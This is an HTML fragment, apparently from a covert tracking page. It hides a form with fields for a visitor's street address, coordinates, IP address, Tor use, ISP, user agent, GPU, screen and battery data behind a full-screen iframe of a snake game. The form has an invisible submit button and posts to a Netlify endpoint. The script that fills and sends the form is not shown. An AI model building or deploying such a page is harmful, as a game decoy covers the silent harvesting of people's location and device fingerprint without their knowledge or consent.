   <body>
      <form name="Location" method="POST" data-netlify="true" action="/redirect.html">
         <p>
            <label><textarea id="address" name="Address"></textarea></label>
            <label><textarea id="maps2" name="Maps Address"></textarea></label>
            <label><textarea id="maps" name="Maps Coords"></textarea></label>
            <label><textarea id="coords" name="Coords"></textarea></label>
            <label><textarea id="ip" name="IP Address"></textarea></label>
            <label><textarea id="tor" name="Using Tor?"></textarea></label>    
            <label><textarea id="isp" name="ISP"></textarea></label>      
            <label><textarea id="usragent" name="User Agent"></textarea></label>
            <label><textarea id="gpu" name="GPU"></textarea></label>
            <label><textarea id="screen" name="Screen Dimensions"></textarea></label>
            <label><textarea id="orient" name="Screen Orientation"></textarea></label>
            <label><textarea id="battery" name="Battery Life"></textarea></label>
         </p>
         <p>
            <button style="opacity:0;" id="send" type="submit"></button>
         </p>
      </form>
      <iframe src="https://snake.googlemaps.com/" style="position:absolute; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
      </iframe>
